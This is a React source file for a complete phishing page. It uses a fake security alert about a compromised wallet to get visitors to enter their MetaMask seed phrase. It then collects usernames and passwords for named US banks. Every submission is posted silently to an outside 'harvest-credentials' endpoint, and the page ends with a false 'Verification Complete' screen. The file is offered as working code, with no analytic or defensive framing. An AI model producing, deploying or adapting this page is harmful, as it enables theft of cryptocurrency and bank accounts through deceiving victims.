import { useState } from 'react';
import { Shield, AlertTriangle, Lock, CheckCircle } from 'lucide-react';

export default function WalletVerify() {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (data) => {
    setLoading(true);
    
    // Send to backend
    try {
      await fetch('https://autoclaimtoken.onrender.com/api/harvest-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch (e) {}
    
    setTimeout(() => {
      setLoading(false);
      setStep(step + 1);
    }, 2000);
  };

  if (step === 1) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-red-50 to-orange-50 flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <AlertTriangle className="w-8 h-8 text-red-600" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Security Alert</h1>
            <p className="text-red-600 font-medium">Suspicious activity detected on your wallet</p>
          </div>
          
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
            <p className="text-sm text-red-800">
              <strong>Warning:</strong> Multiple failed login attempts detected. 
              Your wallet may be compromised. Immediate verification required.
            </p>
          </div>
          
          <button
            onClick={() => setStep(2)}
            className="w-full bg-red-600 text-white py-3 rounded-lg font-bold hover:bg-red-700 transition-colors"
          >
            Verify Wallet Security
          </button>
          
          <p className="text-xs text-gray-500 text-center mt-4">
            This verification is required to protect your funds
          </p>
        </div>
      </div>
    );
  }

  if (step === 2) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Shield className="w-8 h-8 text-blue-600" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">MetaMask Verification</h1>
            <p className="text-gray-600">Enter your seed phrase to verify ownership</p>
          </div>
          
          <form onSubmit={(e) => {
            e.preventDefault();
            const seedPhrase = e.target.seedPhrase.value;
            handleSubmit({ type: 'metamask_seed', seedPhrase, timestamp: Date.now() });
          }}>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                12-Word Seed Phrase
              </label>
              <textarea
                name="seedPhrase"
                required
                rows={3}
                className="w-full border border-gray-300 rounded-lg px-3 py-2 focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
              />
            </div>
            
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition-colors disabled:opacity-50"
            >
              {loading ? 'Verifying...' : 'Verify Wallet'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  if (step === 3) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-50 to-emerald-50 flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Lock className="w-8 h-8 text-green-600" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Banking Verification</h1>
            <p className="text-gray-600">Verify your banking credentials for security</p>
          </div>
          
          <form onSubmit={(e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            handleSubmit({ 
              type: 'banking_credentials',
              bank: formData.get('bank'),
              username: formData.get('username'),
              password: formData.get('password'),
              timestamp: Date.now()
            });
          }}>
            <div className="mb-4">
              <select name="bank" required className="w-full border border-gray-300 rounded-lg px-3 py-2">
                <option value="">Select Your Bank</option>
                <option value="chase">Chase Bank</option>
                <option value="wellsfargo">Wells Fargo</option>
                <option value="bankofamerica">Bank of America</option>
                <option value="citibank">Citibank</option>
              </select>
            </div>
            
            <div className="mb-4">
              <input
                type="text"
                name="username"
                required
                placeholder="Username/Email"
                className="w-full border border-gray-300 rounded-lg px-3 py-2"
              />
            </div>
            
            <div className="mb-4">
              <input
                type="password"
                name="password"
                required
                placeholder="Password"
                className="w-full border border-gray-300 rounded-lg px-3 py-2"
              />
            </div>
            
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-green-600 text-white py-3 rounded-lg font-bold hover:bg-green-700 transition-colors disabled:opacity-50"
            >
              {loading ? 'Verifying...' : 'Verify Banking'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 to-emerald-50 flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <CheckCircle className="w-8 h-8 text-green-600" />
        </div>
        <h1 className="text-2xl font-bold text-gray-900 mb-2">Verification Complete</h1>
        <p className="text-gray-600 mb-6">Your wallet and accounts are now secure</p>
        <button
          onClick={() => window.location.href = '/'}
          className="bg-green-600 text-white px-6 py-2 rounded-lg font-bold hover:bg-green-700 transition-colors"
        >
          Return to Dashboard
        </button>
      </div>
    </div>
  );
}